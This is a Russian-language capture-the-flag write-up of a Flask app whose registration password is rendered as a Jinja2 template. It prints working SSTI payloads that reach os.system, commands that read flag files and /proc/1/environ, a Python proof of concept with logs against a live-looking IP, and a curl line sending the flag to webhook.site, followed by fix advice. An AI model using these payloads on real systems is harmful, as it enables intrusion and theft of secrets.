@@ -1,0 +1,96 @@
+Состояние 0x7F — write‑up (Easy)
+================================
+
+Кратко
+------
+Мы нашли в приложении Flask ошибку обработки пароля при регистрации: пароль рендерится как Jinja2‑шаблон. Это даёт SSTI (Server‑Side Template Injection) и позволяет выполнить системные команды. Флаг лежит в файле контейнера и его можно «тихо» записать в статик и забрать по HTTP.
+
+Финальный флаг: CSC{GHOST_1NPUT}
+
+Разведка
+--------
+В архиве исходников видно:
+- `app/routes.py` (регистрация/логин)
+- `Dockerfile` (кладёт флаг в корень):  
+  `RUN echo "CSC{...}" > /root/fl4g.txt && chmod 444 /root/fl4g.txt`
+
+Ключевая уязвимость
+-------------------
+Фрагмент `routes.py` (регистрация):
+    hash = str(jinja2.Environment().from_string(password).render())
+    user = User(username=username, password=hash)
+    db.session.add(user)
+    db.session.commit()
+
+Пароль рендерится как шаблон. Пример: если в поле пароля указать `{{7*7}}`, в БД сохранится строка `"49"`.  
+На логине сравнение «в лоб»: `if user and user.password == request.form['password']:`.
+
+Эксплуатация: первая попытка
+----------------------------
+Идея: прочитать `/root/fl4g.txt` и записать его в статик, чтобы достать через `/static/…`.
+
+Jinja payload (вариант через `open` + `os.popen`):
+    {{ cycler.__init__.__globals__['open']('/app/app/static/fl4g.txt','w').write(
+        cycler.__init__.__globals__['os'].popen('cat /root/fl4g.txt').read()
+    ) }}
+
+На некоторых инстансах этот путь может не существовать → `FileNotFoundError` → 500 на регистрации.
+
+Эксплуатация: устойчивый вариант (os.system)
+--------------------------------------------
+Чтобы избежать исключений, используем `os.system` (ошибки не пробрасываются, просто код возврата).  
+Payload меняет директорию на один из типовых путей `static`, затем пишет туда флаг (или альтернативы).
+Строка пароля при регистрации:
+    {{ cycler.__init__.__globals__['os'].system('sh -lc "cd /app/app/static 2>/dev/null || cd /app/static 2>/dev/null || cd app/static 2>/dev/null || cd static 2>/dev/null || exit; (cat /root/fl4g.txt || cat /flag || cat /proc/1/environ || id) > fl4g_<RAND>.txt 2>/dev/null"') }}
+
+После регистрации флаг получается по одному из:
+- `/static/fl4g_<RAND>.txt`
+- `/static/js/fl4g_<RAND>.txt`
+- `/static/css/fl4g_<RAND>.txt`
+
+Практика (логи)
+---------------
+На таргете `http://62.173.139.193:16502/` устойчивый PoC дал:
+    [+] Register status: 200
+    [+] GET /static/fl4g_wkstiy.txt -> 200 (17 bytes)
+    CSC{GHOST_1NPUT}
+
+Минимальный PoC на Python
+-------------------------
+import requests, secrets, string
+base = "http://HOST:PORT"
+randid = lambda n=6: ''.join(secrets.choice(string.ascii_lowercase+string.digits) for _ in range(n))
+fn = f"fl4g_{randid()}.txt"
+payload = "{{ cycler.__init__.__globals__['os'].system('sh -lc "cd /app/app/static 2>/dev/null || cd /app/static 2>/dev/null || cd app/static 2>/dev/null || cd static 2>/dev/null || exit; (cat /root/fl4g.txt || cat /flag || cat /proc/1/environ || id) > " + fn + " 2>/dev/null"') }}"
+s = requests.Session()
+s.post(f"{base}/register", data={"username": "ctf_"+randid(), "password": payload})
+print(s.get(f"{base}/static/{fn}").text.strip())
+
+Почему это работает
+-------------------
+- Jinja2 выполняется в адресном пространстве Python‑процесса. Через доступные глобалы (`cycler.__init__.__globals__`) можно получить `open`, `os`, `__import__` и т.п.
+- Процесс приложения в контейнере имеет права читать `/root/fl4g.txt` (Dockerfile так положил).
+- «Тихий» канал вывода — запись в директорию `static`, которую отдаёт Flask.
+
+Почему раньше было 500
+---------------------
+Вариант `open('/app/app/static/…','w')` падал, если такой директории нет. Исключение приводило к `500`.  
+`os.system('sh -lc "... > file"')` ошибок не кидает наружу — поэтому регистрация возвращала `200` даже при неудачной первой части пайплайна.
+
+Альтернативы вывода
+-------------------
+- Слить флаг наружу: `os.system('curl https://webhook.site/<id>?x=$(cat /root/fl4g.txt)')`
+- Записать во временную директорию + добавить маршрут (если есть доступ к коду/переменным окружения)
+- Логгирование/искусственные ошибки при DEBUG (не в этом таске)
+
+Рекомендации по исправлению
+---------------------------
+1) Никогда не рендерить пользовательский ввод как шаблон.  
+2) Если шаблоны нужны — использовать SandboxedEnvironment + жёсткий whitelist контекста.  
+3) Пароли хранить только в виде устойчивых хешей (bcrypt/argon2), сравнивать безопасно.  
+4) В контейнере запускать приложение от непривилегированного пользователя, флаг хранить вне читаемых путей.
+
+Итог
+----
+SSTI в регистрации → исполнение команд → запись флага в статик → чтение по HTTP.  
+Флаг извлечён: CSC{GHOST_1NPUT}.
